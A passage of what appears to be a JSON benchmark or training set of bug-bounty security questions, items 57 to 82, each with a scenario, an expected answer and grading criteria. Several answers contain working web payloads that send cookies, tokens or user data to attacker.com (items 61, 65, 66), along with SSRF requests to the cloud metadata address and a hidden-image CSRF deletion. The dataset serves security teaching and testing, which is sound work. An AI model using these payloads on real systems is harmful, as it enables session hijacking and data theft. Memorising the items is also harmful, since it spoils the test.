+    "evaluation_criteria": "Mentions attempt feasibility analysis.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 57,
+    "scenario": "A PDF rendering service fetches external resources.",
+    "prompt": "What vulnerability chain should be tested?",
+    "expected_answer": "This is a Server-Side Request Forgery (SSRF) vulnerability through the PDF rendering engine, where the service follows external resource references (images, stylesheets, fonts, iframes) embedded in the PDF input, allowing an attacker to force the server to make requests to arbitrary internal or external URLs. By injecting HTML or PDF markup containing references to internal IP addresses, cloud metadata endpoints, or attacker-controlled servers, the attacker can probe internal infrastructure, exfiltrate data through DNS or HTTP callbacks, and access cloud credentials. The real-world impact includes access to cloud metadata services for credential theft, internal network port scanning and service discovery, reading local files through file:// URI schemes if supported by the renderer, and exfiltrating sensitive data through out-of-band channels. A proof-of-concept involves submitting HTML-to-PDF content containing <img src=\"http://169.254.169.254/latest/meta-data/\"> or <iframe src=\"http://internal-service:8080/admin\">, generating the PDF, and examining the rendered output for internal resource content or monitoring the attacker's server for callback requests. Remediation requires disabling external resource loading in the PDF rendering engine configuration, implementing URL validation and allowlisting for any necessary external resources, running the renderer in a network-isolated sandbox with no access to internal services, using a dedicated egress proxy for controlled outbound requests, and sanitizing all user-supplied HTML before rendering.",
+    "reasoning_requirement": "Recognize external resource fetching risk.",
+    "evaluation_criteria": "Mentions internal network probing via SSRF.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 58,
+    "scenario": "A role-based feature hides admin buttons but API still allows access.",
+    "prompt": "What vulnerability type applies?",
+    "expected_answer": "This is an Insecure Direct Object Reference combined with broken authorization vulnerability where access control is only enforced at the UI layer by hiding interface elements, while the underlying API endpoints remain fully accessible to any authenticated user. An attacker can discover admin API endpoints through JavaScript source code analysis, network traffic inspection, API documentation, or directory brute-forcing, then call these endpoints directly to perform administrative actions without the corresponding role. The real-world impact is complete privilege escalation, as any authenticated user can perform admin functions including user management, configuration changes, data export, and system-level operations by bypassing the cosmetic frontend restrictions. A proof-of-concept involves authenticating as a regular user, inspecting the application's JavaScript bundle or API documentation for admin endpoint paths, then making direct API calls to these endpoints using curl or Burp Suite and demonstrating successful execution of admin-level operations. Remediation requires implementing server-side authorization checks on every API endpoint that verify the caller's role before processing the request, using centralized authorization middleware, applying the principle of defense in depth where both UI and API enforce access controls independently, and adding comprehensive authorization test coverage for all endpoints.",
+    "reasoning_requirement": "Recognize frontend-only restriction weakness.",
+    "evaluation_criteria": "Mentions server-side enforcement absence.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 59,
+    "scenario": "A JWT contains sensitive data in plaintext payload.",
+    "prompt": "What risk exists?",
+    "expected_answer": "This is an information disclosure vulnerability through JWT token inspection, as JWT payloads are merely base64url-encoded (not encrypted) and can be trivially decoded by anyone who obtains the token. Sensitive data such as user roles, email addresses, internal user IDs, subscription levels, account flags, or even password hashes stored in the JWT payload is fully readable by decoding the middle segment of the token. The real-world impact includes exposure of PII that violates privacy regulations, leaking internal authorization flags that reveal the application's access control model for exploitation, disclosing business logic details about user tiers and permissions, and providing reconnaissance data that accelerates other attack vectors. A proof-of-concept involves capturing the JWT from the Authorization header or cookie, splitting it at the period delimiters, base64url-decoding the payload segment (second part), and documenting all sensitive fields exposed in cleartext using tools like jwt.io or a simple base64 decoder. Remediation requires removing all sensitive data from JWT payloads and storing it server-side referenced by an opaque session identifier, using JWE (JSON Web Encryption) if sensitive claims must be included in the token, minimizing JWT payload to only essential claims (sub, iat, exp, iss), and implementing token introspection for any additional user data needs.",
+    "reasoning_requirement": "Understand JWT is base64-encoded not encrypted.",
+    "evaluation_criteria": "Mentions exposure of PII or internal claims.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 60,
+    "scenario": "File upload stores files in publicly accessible bucket with predictable names.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an unauthorized file access vulnerability through predictable URL enumeration, where files stored in publicly accessible cloud storage (S3, GCS, Azure Blob) with predictable naming patterns (sequential IDs, timestamps, or original filenames) can be discovered and downloaded by anyone. An attacker can enumerate file URLs by iterating through predictable patterns like https://bucket.s3.amazonaws.com/uploads/1001.pdf, https://bucket.s3.amazonaws.com/uploads/1002.pdf to access confidential documents uploaded by other users. The real-world impact includes exposure of sensitive documents like identification cards, medical records, financial statements, and private communications, potentially affecting thousands of users if the naming pattern covers the entire upload history. A proof-of-concept involves uploading a test file, noting the resulting URL pattern, then modifying the filename component to enumerate nearby values using Burp Intruder or a custom script, and documenting how many other users' files are accessible. Remediation requires generating cryptographically random filenames for all uploads, implementing per-object access control policies that require authentication, using pre-signed URLs with short expiration times for file access, blocking public listing on the storage bucket, and implementing server-side access validation that verifies the requesting user owns the file before generating a download URL.",
+    "reasoning_requirement": "Recognize object enumeration risk.",
+    "evaluation_criteria": "Mentions direct object access.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 61,
+    "scenario": "A comment system stores input and renders without sanitization.",
+    "prompt": "What vulnerability type applies?",
+    "expected_answer": "This is a Stored (Persistent) Cross-Site Scripting (XSS) vulnerability where malicious JavaScript payloads injected through the comment system are permanently saved in the database and executed in the browser of every user who views the affected page. Unlike reflected XSS, stored XSS does not require the victim to click a specially crafted link\u2014simply viewing the page containing the malicious comment triggers the payload execution in their authenticated session context. The real-world impact is severe and scalable: a single malicious comment can compromise every user who views that page, enabling mass session hijacking, credential theft via fake login overlays, cryptojacking, defacement, and worm-like propagation where the payload creates additional malicious comments. A proof-of-concept involves submitting a comment containing <script>document.location='https://attacker.com/steal?c='+document.cookie</script>, viewing the page in another browser session, and demonstrating the script executes and sends the session cookie to the attacker's server. Remediation requires implementing server-side HTML sanitization using a proven library (DOMPurify, Bleach), applying context-aware output encoding when rendering user-generated content, deploying Content Security Policy headers without unsafe-inline, using a web application firewall as an additional layer, and implementing content moderation workflows for user-generated content.",
+    "reasoning_requirement": "Recognize persistent injection vector.",
+    "evaluation_criteria": "Mentions script execution on other users.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 62,
+    "scenario": "An endpoint allows account deletion via GET request.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a Cross-Site Request Forgery (CSRF) vulnerability amplified by the use of a GET request for a destructive state-changing operation, which violates HTTP method semantics and makes exploitation trivially easy. Since GET requests can be triggered by simply loading an image tag (<img src=\"https://target.com/api/delete-account\">), embedding a link, or including the URL in an email, an attacker can delete a victim's account without any user interaction beyond visiting a malicious page. The real-world impact is permanent account destruction and data loss for any authenticated user who visits a page controlled by the attacker or clicks a disguised link, with no confirmation or additional authentication required. A proof-of-concept involves creating a simple HTML page containing <img src=\"https://vulnerable-app.com/api/delete-account\" style=\"display:none\"> and hosting it on an attacker-controlled domain, then having an authenticated victim visit the page and verifying their account is deleted. Remediation requires using POST/DELETE methods for state-changing operations, implementing anti-CSRF tokens on all mutating endpoints, adding SameSite=Strict cookie attributes, requiring re-authentication for destructive operations like account deletion, and implementing a confirmation step with a unique token for irreversible actions.",
+    "reasoning_requirement": "Recognize unsafe HTTP method usage.",
+    "evaluation_criteria": "Mentions state-changing GET vulnerability.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 63,
+    "scenario": "A GraphQL API allows querying arbitrary nested fields.",
+    "prompt": "What risk should be evaluated?",
+    "expected_answer": "This is an Excessive Data Exposure vulnerability combined with denial of service risk through deep nested queries in GraphQL, where the lack of query depth limits and field restrictions allows attackers to extract sensitive data and overwhelm server resources. An attacker can craft deeply nested queries that traverse relationships to access data they shouldn't see (e.g., querying user->organization->members->privateData) and create exponentially expanding queries that consume server memory and CPU. The real-world impact includes unauthorized access to sensitive data through relationship traversal, server resource exhaustion through malicious queries like {users{friends{friends{friends{...}}}}}, exposure of internal data model structure, and potential database overload from unoptimized deeply-nested resolver chains. A proof-of-concept involves sending progressively deeper nested queries to map accessible data relationships, documenting sensitive data reachable through traversal, and demonstrating server performance degradation with exponentially expanding query structures. Remediation requires implementing query depth limiting (typically 5-10 levels maximum), adding query complexity analysis and cost limits, implementing field-level authorization on all resolvers, using persistent queries or query whitelisting in production, setting execution timeouts, and implementing pagination requirements on all list-type fields.",
+    "reasoning_requirement": "Recognize deep query abuse.",
+    "evaluation_criteria": "Mentions data over-fetching risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 64,
+    "scenario": "A webhook sends sensitive data over HTTP.",
+    "prompt": "What vulnerability exists?",
+    "expected_answer": "This is a sensitive data exposure vulnerability through unencrypted transport, where webhook payloads containing sensitive information (API keys, user data, payment details, authentication tokens) are transmitted over plaintext HTTP and can be intercepted by any entity with network access along the path. Network-level attackers, compromised routers, ISPs, and man-in-the-middle positions can passively capture all webhook data including personally identifiable information, financial data, and authentication credentials. The real-world impact includes exposure of customer payment information violating PCI-DSS compliance, leakage of authentication tokens enabling account takeover, disclosure of business transaction data to competitors or malicious actors, and regulatory violations under GDPR and HIPAA for transmitting personal data without encryption. A proof-of-concept involves capturing network traffic on the webhook delivery path using tcpdump or Wireshark, filtering for HTTP traffic to the webhook endpoint, and demonstrating that sensitive payload content is visible in cleartext. Remediation requires enforcing HTTPS (TLS 1.2+) for all webhook delivery URLs, rejecting webhook registration with HTTP URLs, implementing webhook payload signing (HMAC) for integrity verification independent of transport, encrypting sensitive payload fields at the application layer, and implementing certificate pinning for webhook delivery to prevent TLS interception.",
+    "reasoning_requirement": "Recognize TLS absence risk.",
+    "evaluation_criteria": "Mentions interception feasibility.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 65,
+    "scenario": "Application stores access tokens in localStorage.",
+    "prompt": "What vulnerability chain should be evaluated?",
+    "expected_answer": "This creates a token theft vulnerability chain where any Cross-Site Scripting (XSS) vulnerability in the application can be leveraged to steal access tokens stored in localStorage, since JavaScript has unrestricted read access to localStorage from the same origin. Unlike httpOnly cookies which are inaccessible to JavaScript, localStorage values can be trivially exfiltrated with a single line: fetch('https://attacker.com/steal?token='+localStorage.getItem('access_token')). The real-world impact is that any XSS vulnerability\u2014reflected, stored, or DOM-based\u2014becomes an immediate account takeover vector, as stolen access tokens can be used from any device or location to impersonate the victim without requiring their password or session. A proof-of-concept involves finding any XSS injection point in the application, injecting a payload that reads the token from localStorage and sends it to an attacker-controlled server, then using the stolen token to make authenticated API calls from a completely different browser or machine. Remediation requires migrating token storage to httpOnly, Secure, SameSite cookies that are inaccessible to JavaScript, implementing short-lived access tokens with refresh token rotation, using the Backend-for-Frontend (BFF) pattern where tokens are stored server-side, adding token binding to specific client fingerprints, and implementing robust XSS prevention as defense in depth.",
+    "reasoning_requirement": "Understand localStorage exposure to JS.",
+    "evaluation_criteria": "Mentions token exfiltration risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 66,
+    "scenario": "An API endpoint supports JSONP.",
+    "prompt": "What security risk exists?",
+    "expected_answer": "This is a cross-site data leakage vulnerability through JSONP (JSON with Padding), where the endpoint wraps API responses in a callback function that can be loaded from any origin via a script tag, effectively bypassing the same-origin policy. An attacker can create a malicious webpage that includes a script tag pointing to the JSONP endpoint with a custom callback function, and when an authenticated victim visits the page, the browser sends cookies along with the request, returning the victim's data wrapped in the attacker's callback function. The real-world impact includes cross-origin theft of authenticated user data, session information, and any sensitive data returned by the JSONP endpoint, all without requiring any CORS misconfiguration since JSONP inherently bypasses same-origin restrictions. A proof-of-concept involves creating an HTML page with <script src='https://vulnerable-api.com/user/profile?callback=stealData'></script> and a JavaScript function stealData(data) { fetch('https://attacker.com/exfil', {method:'POST', body:JSON.stringify(data)}) }, then having an authenticated user visit the page. Remediation requires deprecating JSONP support in favor of properly configured CORS, implementing CSRF token validation on JSONP endpoints if they must remain active, restricting callback parameter values to a whitelist, and migrating all cross-origin data access to use standard CORS with strict origin validation.",
+    "reasoning_requirement": "Recognize JSONP callback abuse.",
+    "evaluation_criteria": "Mentions cross-origin data exposure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 67,
+    "scenario": "A password change endpoint does not require current password.",
+    "prompt": "What vulnerability may exist?",
+    "expected_answer": "This vulnerability enables account takeover when combined with any session compromise, as an attacker who gains temporary access to a user's session (through XSS, session fixation, shared computer, or session hijacking) can permanently lock out the legitimate user by changing their password without needing to know the current one. The missing reauthentication step means there is no verification that the person making the password change is actually the account owner, removing a critical safeguard against unauthorized session use. The real-world impact is that any temporary session compromise becomes a permanent account takeover, because the attacker can immediately change the password, locking out the legitimate user and gaining persistent access through new credentials they control. A proof-of-concept involves obtaining a valid session (simulating XSS cookie theft), navigating directly to the password change API endpoint, submitting a new password without providing the current password, and demonstrating successful password change and ability to log in with the new password from a different device. Remediation requires mandating current password verification for all password change operations, implementing step-up authentication (MFA challenge) for sensitive account changes, sending email notifications for password changes with a temporary reversal option, implementing session re-validation before critical account modifications, and adding a cooldown period between password changes.",
+    "reasoning_requirement": "Recognize missing verification step.",
+    "evaluation_criteria": "Mentions insufficient reauthentication.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 68,
+    "scenario": "An admin dashboard exposes CSV export of all users without role check.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a Broken Access Control vulnerability where the admin CSV export endpoint lacks role-based authorization, allowing any authenticated user to download a complete dump of all user data regardless of their privilege level. The missing authorization check means the endpoint only requires a valid session token but does not verify whether the authenticated user has administrative privileges to perform bulk data exports. The real-world impact is a catastrophic data breach exposing all user records including personally identifiable information (names, emails, addresses, phone numbers), potentially financial data, and account metadata, violating GDPR, CCPA, and other privacy regulations with significant legal and financial consequences. A proof-of-concept involves authenticating as a regular (non-admin) user, navigating directly to the CSV export endpoint URL (discovered through JavaScript source inspection, API documentation, or URL pattern guessing), and demonstrating successful download of the full user database export. Remediation requires implementing role-based authorization middleware that validates admin privileges before processing the export request, adding audit logging for all bulk data export operations, implementing export rate limiting and size restrictions, requiring MFA confirmation for data export operations, and conducting regular access control reviews on all administrative endpoints.",
+    "reasoning_requirement": "Recognize missing privilege validation.",
+    "evaluation_criteria": "Mentions unauthorized data export.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 69,
+    "scenario": "A system uses predictable session IDs.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a session prediction attack vulnerability where the use of predictable session identifiers (based on sequential numbers, timestamps, user IDs, or weak random number generators) allows an attacker to calculate or guess valid session IDs belonging to other users. By analyzing the pattern in their own session IDs over multiple authentication attempts, an attacker can derive the generation algorithm and predict valid session IDs for other concurrent users without needing their credentials. The real-world impact is direct session hijacking, where an attacker can impersonate any user by predicting and using their session ID in a cookie or header, gaining full access to accounts, data, and functionality without any authentication. A proof-of-concept involves collecting multiple session IDs, analyzing them for patterns (sequential incrementing, timestamp-based, or low-entropy randomness), using statistical analysis or reverse engineering to identify the generation algorithm, then predicting a valid session ID for another active user and using it to authenticate. Remediation requires using cryptographically secure pseudo-random number generators (CSPRNG) for session ID generation, ensuring session IDs have at least 128 bits of entropy, implementing session binding to client attributes (IP, User-Agent), adding session anomaly detection for concurrent usage, and regenerating session IDs after authentication and privilege changes.",
+    "reasoning_requirement": "Recognize low entropy session generation.",
+    "evaluation_criteria": "Mentions hijacking possibility.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 70,
+    "scenario": "An application fails to invalidate API keys after user removal.",
+    "prompt": "What vulnerability exists?",
+    "expected_answer": "This is an orphaned credential access vulnerability where API keys associated with removed or deactivated user accounts remain valid and functional, allowing continued unauthorized access to the application's API after the user should have lost all access. When employees are terminated, contractors' engagements end, or user accounts are suspended, their previously issued API keys continue to authenticate successfully, creating an invisible backdoor into the system. The real-world impact includes unauthorized data access by former employees or compromised accounts, persistent API abuse that cannot be traced to an active user, compliance violations for failing to enforce user lifecycle management, and potential data exfiltration or sabotage by disgruntled former users. A proof-of-concept involves creating a user account, generating an API key, deleting or deactivating the user account, then using the previously issued API key to make authenticated API calls and demonstrating it still grants access. Remediation requires implementing cascading credential revocation that automatically invalidates all API keys, tokens, and sessions when a user account is removed or deactivated, adding API key lifecycle management tied to user status, implementing regular API key audits that identify orphaned credentials, setting API key expiration policies, and creating automated processes that scan for and revoke credentials belonging to inactive accounts.",
+    "reasoning_requirement": "Understand lifecycle management failure.",
+    "evaluation_criteria": "Mentions continued access risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 71,
+    "scenario": "A password reset form accepts both email and user ID parameters.",
+    "prompt": "What should be tested?",
+    "expected_answer": "This is an account takeover vulnerability through parameter tampering where the dual-parameter password reset flow creates an account binding mismatch between the email verification and the user ID that receives the password change. An attacker can submit their own email address (which they control and can verify) alongside a victim's user ID, potentially causing the password reset to be verified against the attacker's email but applied to the victim's account. The real-world impact is direct account takeover of any user whose user ID is known (often enumerable through sequential IDs or user profile pages), without requiring access to the victim's email inbox or any other authentication factor. A proof-of-concept involves intercepting the password reset request, replacing the user_id parameter with a target victim's ID while keeping the attacker's email, completing the reset verification through the link sent to the attacker's email, and verifying the password change was applied to the victim's account. Remediation requires using only a single identifier (email) in the reset flow and deriving the account server-side, removing the user ID parameter from the client-accessible reset request, binding reset tokens cryptographically to the specific account they were generated for, implementing server-side validation that both parameters reference the same account, and adding email notification to the account owner when a reset is initiated.",
+    "reasoning_requirement": "Recognize multiple identifier mismatch risk.",
+    "evaluation_criteria": "Mentions account binding validation failure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 72,
+    "scenario": "A file processing API decompresses ZIP files without size limits.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a Zip Bomb (decompression bomb) denial of service vulnerability where the API processes uploaded ZIP archives without validating the decompressed size, allowing an attacker to submit a small compressed file that expands to enormous sizes and exhausts server memory, disk space, or CPU resources. A classic zip bomb like 42.zip is only 42KB compressed but decompresses to 4.5 petabytes through nested compression layers, and even simpler variants with high compression ratios can expand a 1MB upload to multiple gigabytes. The real-world impact is service disruption through resource exhaustion, potentially crashing the application server, filling disk partitions, triggering out-of-memory conditions, and affecting other services on shared infrastructure. A proof-of-concept involves creating a zip file with high compression ratio (e.g., compressing a file filled with zeros, which compresses at ~1000:1 ratio), uploading it to the API, and monitoring server resource consumption as it attempts to decompress the file. Remediation requires implementing decompressed size limits by checking the declared uncompressed size in ZIP headers before extraction, streaming decompression with byte counting and abort thresholds, limiting the number of files and nesting depth within archives, running decompression in resource-constrained sandboxes (cgroups or containers with memory limits), and implementing timeout controls on decompression operations.",
+    "reasoning_requirement": "Recognize decompression resource exhaustion.",
+    "evaluation_criteria": "Mentions DoS via oversized expansion.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 73,
+    "scenario": "An API uses predictable order numbers in refunds endpoint.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is an IDOR vulnerability in the refund processing endpoint where predictable sequential order numbers allow an attacker to enumerate and initiate refunds for other users' orders, causing direct financial loss. By iterating through order numbers in the refund API request, an attacker can trigger unauthorized refunds on orders belonging to other customers, potentially redirecting refund payments to their own account or disrupting the business's financial operations. The real-world impact includes direct financial theft through unauthorized refund initiation, disruption of business operations and customer relationships when legitimate orders are refunded, potential for large-scale financial fraud by scripting mass refund requests across all enumerable order numbers, and inventory management chaos from refunded orders. A proof-of-concept involves placing a legitimate order, noting the order number pattern, then modifying the order number in refund requests to target other users' orders, iterating through sequential IDs using Burp Intruder, and documenting successful refund initiations on orders not belonging to the attacker. Remediation requires implementing ownership verification that confirms the requesting user is the order owner before processing any refund, replacing sequential order numbers with non-enumerable UUIDs, adding financial transaction authorization requirements (e.g., manager approval for refunds above a threshold), implementing rate limiting on refund endpoints, and adding comprehensive audit logging for all refund operations.",
+    "reasoning_requirement": "Recognize transaction enumeration risk.",
+    "evaluation_criteria": "Mentions financial impact.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 74,
+    "scenario": "Application exposes Swagger documentation publicly.",
+    "prompt": "What risk should be evaluated?",
+    "expected_answer": "Publicly exposed Swagger/OpenAPI documentation dramatically expands the attack surface by providing a complete, detailed blueprint of all API endpoints, including hidden or undocumented ones, their parameter schemas, authentication mechanisms, and data models. An attacker can use this documentation to identify high-value targets such as admin endpoints, file upload handlers, financial operations, and user management APIs that would otherwise require extensive reconnaissance and fuzzing to discover. The real-world impact includes accelerated attack planning with full knowledge of the API's capabilities, discovery of deprecated but still-functional endpoints that may lack current security controls, understanding of exact parameter formats for crafting precision attacks, and identification of authentication bypass opportunities through endpoint-specific auth requirements. A proof-of-concept involves accessing the Swagger UI (commonly at /swagger, /api-docs, /docs, /swagger-ui.html), documenting all discovered endpoints with their authentication requirements, identifying endpoints that lack authentication, and using the 'Try It Out' feature to test API calls directly from the documentation interface. Remediation requires restricting access to API documentation behind authentication, removing Swagger UI from production deployments or limiting it to internal networks, implementing API gateway controls that enforce authentication regardless of documentation exposure, and regularly auditing published API documentation for sensitive endpoint disclosure.",
+    "reasoning_requirement": "Recognize API documentation exposure risk.",
+    "evaluation_criteria": "Mentions hidden endpoints discovery.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 75,
+    "scenario": "A session cookie lacks SameSite attribute.",
+    "prompt": "What vulnerability may exist?",
+    "expected_answer": "This creates a Cross-Site Request Forgery (CSRF) vulnerability because without the SameSite cookie attribute, the browser will automatically include the session cookie in cross-origin requests initiated from attacker-controlled websites, allowing unauthorized state-changing actions on behalf of the authenticated user. When SameSite is not set, the browser defaults to SameSite=Lax in modern browsers (which protects POST requests but not GET-based state changes) or SameSite=None in older browsers (which provides no protection at all). The real-world impact includes unauthorized actions performed on the victim's behalf such as password changes, fund transfers, email modifications, and data deletion when the victim visits a malicious website while authenticated to the vulnerable application. A proof-of-concept involves creating an HTML page with a hidden form that auto-submits a state-changing POST request to the vulnerable application, hosting it on a separate domain, and demonstrating that the action executes successfully when visited by an authenticated victim due to the session cookie being included in the cross-origin request. Remediation requires setting the SameSite attribute to Strict or Lax on all session cookies, implementing anti-CSRF tokens as an additional layer of defense, ensuring all state-changing operations use POST/PUT/DELETE methods, adding the Secure flag to prevent cookie transmission over HTTP, and implementing custom request headers that are not sent in simple cross-origin requests.",
+    "reasoning_requirement": "Understand SameSite protection role.",
+    "evaluation_criteria": "Mentions cross-site request risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 76,
+    "scenario": "A multi-step checkout flow validates stock only at first step.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a business logic race condition vulnerability where stock validation occurs only at the initial step of the checkout flow, creating a Time-of-Check to Time-of-Use (TOCTOU) gap that allows concurrent purchases to exceed available inventory. Multiple buyers can pass the stock check simultaneously at step one, then proceed through the remaining checkout steps and complete purchases even after inventory has been depleted by other concurrent transactions. The real-world impact includes overselling of limited inventory, financial losses from fulfilling orders that cannot be shipped, customer dissatisfaction from order cancellations, and potential exploitation of limited-edition or discounted items by bots that intentionally race through checkout. A proof-of-concept involves identifying a product with limited stock (e.g., 1 remaining), opening multiple browser sessions or using automated tools to simultaneously reach step one of checkout, then completing all checkout flows and demonstrating that more units were sold than were available in inventory. Remediation requires implementing stock validation at every step of the checkout flow, using database-level inventory locks during the checkout process, reserving inventory with time-limited holds when users enter checkout, implementing optimistic concurrency control with version checks on final purchase, and adding post-transaction reconciliation that detects and handles oversell situations.",
+    "reasoning_requirement": "Recognize inconsistent validation timing.",
+    "evaluation_criteria": "Mentions concurrent purchase abuse.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 77,
+    "scenario": "An API endpoint accepts serialized objects from clients.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is an Insecure Deserialization vulnerability (OWASP A08) where the API deserializes untrusted client-supplied objects, potentially allowing an attacker to execute arbitrary code, manipulate application logic, or escalate privileges by crafting malicious serialized payloads. When applications deserialize objects from formats like Java ObjectInputStream, Python pickle, PHP unserialize, or .NET BinaryFormatter, an attacker can include gadget chains\u2014sequences of existing class methods that chain together during deserialization to achieve code execution. The real-world impact is often remote code execution (RCE) with the privileges of the application process, enabling complete server compromise, data exfiltration, lateral movement, and persistent backdoor installation, as demonstrated in numerous high-profile breaches. A proof-of-concept involves identifying the serialization format from Content-Type headers or request body patterns, using tools like ysoserial (Java), pickle exploitation scripts (Python), or phpggc (PHP) to generate payloads with known gadget chains, and submitting them to observe server-side code execution or DNS callbacks. Remediation requires avoiding deserialization of untrusted data entirely, using safe data interchange formats like JSON, implementing integrity checks (digital signatures) on serialized data if deserialization is necessary, restricting deserialization to a whitelist of allowed classes, running deserialization in isolated sandboxes with minimal privileges, and keeping all framework dependencies updated to patch known gadget chains.",
+    "reasoning_requirement": "Recognize deserialization of untrusted input.",
+    "evaluation_criteria": "Mentions potential remote code execution.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 78,
+    "scenario": "Password reset link does not bind to specific IP or device.",
+    "prompt": "What impact exists?",
+    "expected_answer": "This vulnerability allows password reset token reuse from any device or network location, meaning an intercepted or leaked reset link can be used by an attacker from anywhere in the world without any device or location binding validation. The lack of contextual validation means that tokens captured through email interception, referrer leakage, log exposure, or shoulder surfing can be immediately used from the attacker's own device and network. The real-world impact is account takeover that persists even in environments where the user's device is secure, as the token's validity is completely independent of the request context, making any token interception vector directly exploitable regardless of geographic or device separation. A proof-of-concept involves triggering a password reset, capturing the reset link, then opening the link from a completely different device, network, and geographic location (e.g., using a VPN from another country), and demonstrating that the password change completes successfully without any additional verification. Remediation requires binding reset tokens to the originating session or IP address range, implementing device fingerprinting that validates the reset is completed from a similar context, sending secondary verification (SMS code or push notification) when the reset is attempted from an unrecognized device or location, reducing token validity windows, and implementing anomaly detection for cross-device token usage patterns.",
+    "reasoning_requirement": "Recognize lack of contextual validation.",
+    "evaluation_criteria": "Mentions cross-device takeover risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 79,
+    "scenario": "Application relies solely on JavaScript validation for payment limits.",
+    "prompt": "What vulnerability type applies?",
+    "expected_answer": "This is a business logic bypass vulnerability where payment limits enforced only through client-side JavaScript validation can be trivially circumvented by disabling JavaScript, modifying requests with a proxy, or using direct API calls that bypass the browser entirely. Since JavaScript runs in the user's browser under their full control, any validation, limit checking, or business rule enforcement performed solely in JavaScript provides zero security guarantees against a determined attacker. The real-world impact includes processing payments below minimum thresholds, exceeding maximum payment limits, manipulating pricing calculations, bypassing fraud detection rules, and creating transactions outside the intended business parameters, all resulting in direct financial loss. A proof-of-concept involves intercepting the payment request in Burp Suite after the client-side validation passes, modifying the amount field to exceed the JavaScript-enforced limit (or reducing it below the minimum), forwarding the modified request, and verifying the server processes the transaction at the tampered value. Remediation requires implementing all payment validation, limit enforcement, and business rule checks on the server side, treating client-side validation purely as a user experience enhancement, using server-side calculated totals based on item IDs and quantities from the authoritative product catalog, implementing transaction monitoring for anomalous patterns, and adding reconciliation checks that compare submitted amounts against expected values.",
+    "reasoning_requirement": "Recognize client-side enforcement weakness.",
+    "evaluation_criteria": "Mentions server-side validation absence.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 80,
+    "scenario": "A public S3 bucket allows listing but not download.",
+    "prompt": "What risk should be evaluated?",
+    "expected_answer": "This is an information disclosure vulnerability through object name enumeration where publicly accessible S3 bucket listing exposes filenames, directory structures, file sizes, and last-modified timestamps even when individual file downloads are restricted. Filenames themselves often contain sensitive information such as customer names, project codes, internal identifiers, date ranges revealing business activity patterns, and descriptive naming that reveals the nature of stored documents. The real-world impact includes competitive intelligence from understanding stored document types and volumes, identification of backup files or configuration exports that may contain credentials, discovery of filename patterns that could be used for social engineering or targeted attacks, and potential identification of files that may be accessible through alternative methods. A proof-of-concept involves accessing the S3 bucket listing endpoint (https://bucket-name.s3.amazonaws.com/?list-type=2 or using aws s3 ls), documenting the exposed filenames and their metadata, and analyzing the filenames for sensitive information patterns like 'customer_exports_2026-01.csv' or 'db_backup_production.sql.gz'. Remediation requires disabling public bucket listing through the S3 bucket policy, enabling S3 Block Public Access settings at the account level, implementing bucket policies that explicitly deny ListBucket for unauthorized principals, auditing all S3 buckets for public access configurations, and implementing AWS CloudTrail monitoring for unauthorized S3 access attempts.",
+    "reasoning_requirement": "Recognize metadata sensitivity.",
+    "evaluation_criteria": "Mentions filename leakage.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 81,
+    "scenario": "An API allows changing email without verifying ownership.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an account takeover vulnerability through unverified email change, where the application allows users to update their email address without confirming ownership of the new email, enabling an attacker to redirect password resets, notifications, and account recovery to an email they control. Once the email is changed, the attacker can trigger a password reset to the new email address, complete the reset, and gain permanent control of the account with credentials they control. The real-world impact is complete and permanent account takeover, as the attacker replaces the victim's email with their own, resets the password, and locks the legitimate owner out of all recovery mechanisms since both the password and email are now under attacker control. A proof-of-concept involves authenticating as a user (or exploiting a session compromise), changing the account email to an attacker-controlled address via the API without any verification challenge, then triggering a password reset to the new email and demonstrating complete account takeover. Remediation requires implementing email verification for all email changes by sending a confirmation link to the new email address before applying the change, requiring current password or MFA confirmation before allowing email changes, sending a notification to the old email address about the change with a reversion option, implementing a cooling-off period before email changes take effect, and maintaining audit logs of all email modifications.",
+    "reasoning_requirement": "Recognize identity binding failure.",
+    "evaluation_criteria": "Mentions takeover risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 82,
+    "scenario": "OAuth flow does not validate state parameter.",
+    "prompt": "What vulnerability exists?",
